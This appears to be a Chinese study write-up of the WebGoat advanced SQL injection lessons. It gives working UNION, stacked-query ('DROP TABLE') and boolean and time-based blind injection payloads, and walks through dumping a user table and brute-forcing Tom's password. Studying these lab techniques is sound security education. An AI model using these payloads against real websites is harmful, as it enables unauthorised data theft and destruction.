---
id: 
title: SQL Injection (advanced)
---
<!-- muse start -->
判断注入点的上下文，此例的上下文即为用户表，可直接对目标用户的密码进行条件盲注。而无需从探测表名开始
<!-- muse end -->

## 特殊字符

### 注释符号

`/* */`          内联注释  
`--`、`#`        行注释  

示例：  
```sql
SELECT * FROM users WHERE name = 'admin' -- AND pass = 'pass'
```

### 查询链符号

`;`              允许查询链式执行  

示例：  
```sql
SELECT * FROM users; DROP TABLE users;
```

### 字符串拼接符号

`'`、`+`、`||`   字符串拼接  
`Char()`         无引号字符串构造  

示例：  
```sql
SELECT * FROM users WHERE name = '+char(27) OR 1=1
```

## 特殊语句

### UNION 操作符

UNION 操作符用于合并两个或多个 SELECT 语句的结果集。

使用 UNION 时需遵循规则：
- 每个 SELECT 语句的列数必须相同
- 对应列的数据类型必须兼容（第一个 SELECT 的第一列需与第二个 SELECT 的第一列数据类型匹配，其他列同理）

示例：  
```sql
SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;
```

UNION ALL 语法允许保留重复值。

### JOIN 操作符

JOIN 操作符用于根据关联列合并多表数据行。

示例：  
```sql
SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;
```

详细 JOIN 用法参考：https://www.w3schools.com/sql/sql_join.asp


## 实战演练：从其他表提取数据

下方的输入字段用于根据姓氏查询用户数据。  
数据表结构为 `user_data`：

```sql
CREATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);
```

通过测试发现该输入字段存在SQL注入漏洞。现需要利用此漏洞获取另一张表的数据。  

目标表结构为：

```sql
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

6.a) 检索目标表全部数据  
6.b) 成功破解后，Dave的密码是什么？

**注意**：本题存在多种解法，可使用UNION操作符或追加新SQL语句实现，请尝试找出两种方案。

输入字段 `Name` 对应 `user_data` 表的 `last_name`列
上下文为 
```sql
SELECT * FROM user_data WHERE last_name = ''
```

对 `last_name` 字段构建注入
- 使用 `UNION`，对应列类型并填充
    ```sql
    ' UNION SELECT userid,user_name,password,cookie,NULL,NULL,NULL FROM user_system_data --
    ```
- 使用分隔符`;`，增加新查询语句
    ```sql
    '; SELECT userid,user_name,password,cookie FROM user_system_data --
    ```

得到目标用户的信息
`105, dave, passW0rD, , `

## 盲SQL注入

盲SQL注入是一种通过向数据库提出真/假问题并根据应用程序的响应判断答案的SQL注入攻击。当Web应用被配置为显示通用错误信息，但未修复存在SQL注入漏洞的代码时，常会使用此种攻击方式。

### 差异分析

首先分析普通SQL注入与盲SQL注入的区别。在普通SQL注入中，数据库错误信息会直接显示，为攻击者提供足够信息以分析查询逻辑。而在基于UNION的SQL注入中，应用不会在网页上直接反馈信息。当无任何信息显示时，攻击者需要通过真/假陈述向数据库提问，因此盲SQL注入的利用难度显著更高。

盲SQL注入主要分为两种类型：基于内容的盲注入和基于时间的盲注入。

### 攻击示例

假设存在以下URL进行数据查询：
`https://my-shop.com?article=4`

服务端对应执行的查询语句为：
```sql
SELECT * FROM articles WHERE article_id = 4
```

为检测漏洞，可将URL修改为：
`https://shop.example.com?article=4 AND 1=1`

对应查询变为：
```sql
SELECT * FROM articles WHERE article_id = 4 AND 1=1
```

若页面响应与原始请求一致，则说明存在盲SQL注入漏洞。若返回页面不存在或其他，则可能无法利用。进一步可测试：
`https://shop.example.com?article=4 AND 1=2`
该条件将导致查询返回空结果（false）。

### 漏洞利用实战

通过构造特定问题逐步提取信息，例如：
`https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2`

常规利用流程：
1. 首先识别数据库类型
2. 根据数据库类型查询系统表结构
3. 枚举数据库中的所有表
4. 逐表提取数据实现数据库脱库

注意事项：若数据库连接账号权限设置合理（无法查询系统表），此方法可能失效。

### 基于时间的盲注入

当响应数据无差异时可使用时间盲注，通过延迟函数判断条件真假：
```sql
article = 4; sleep(10) --
```
该语句会使数据库延迟10秒返回结果，通过响应时间差异验证注入条件。

## 任务说明

现已完成SQL注入基础步骤的讲解。本任务要求综合运用SQL课程中教授的所有知识点。

**目标：** 能否以Tom身份成功登录？

此任务提供登录与注册两个表单，
登录表单似乎无 SQL 注入漏洞。

查看注册表单时，基于当前用户名是否已经注册而返回的信息可作为条件判断。
在用户名字段输入`'`触发错误响应，输入两个单引号正常，存在注入。

构建注入
`test' AND 1=1--` 提示已存在
`test' AND 1=2--` 总是可创建
由此得到，用户名字段上下文为查询语句根据从用户表中检索用户名的布尔值判断是否应当进行创建操作：当条件为 `false`时，总是创建。`test' OR 1=1--` 总是无法创建，此时条件为 `true`


```
test' AND SUBSTRING(database_version(), 1, 1)='b'--
```
常规获得数据库版本的方法在此失效，之前示例的非常规 `database_version()`可用

```
test' AND LENGTH(database_version())=1--
```
爆破得到，数据库版本字符串长度为 5

爆破得到，数据库版本为 2.7.3
但此处无关


测试用户名是否存在
```
Tom' AND 1=1--
tom' AND 1=1--
```
可创建 Tom，但 tom 显示已存在，目标用户名为小写。

当前的上下文是查询用户表中是否存在相同的用户名，即用户表中，可直接尝试查询密码
对于存在的用户名 `tom` 将执行 `AND` 后的密码爆破条件

```
tom' AND SUBSTRING(password,1,1)='a'--
```
设置两个爆破点，爆破1递增数字，爆破2遍历字符
`tom' AND SUBSTRING(password,[爆破1],1)='[爆破2]'--`
最终得到
`thisisasecretfortomonly`
并且发现之后仍然有空字符进行匹配
大量空字符解释了之前尝试使用 `LENGTH`爆破密码长度时的怪异响应
```
tom' AND LENGTH(password)=1--
```

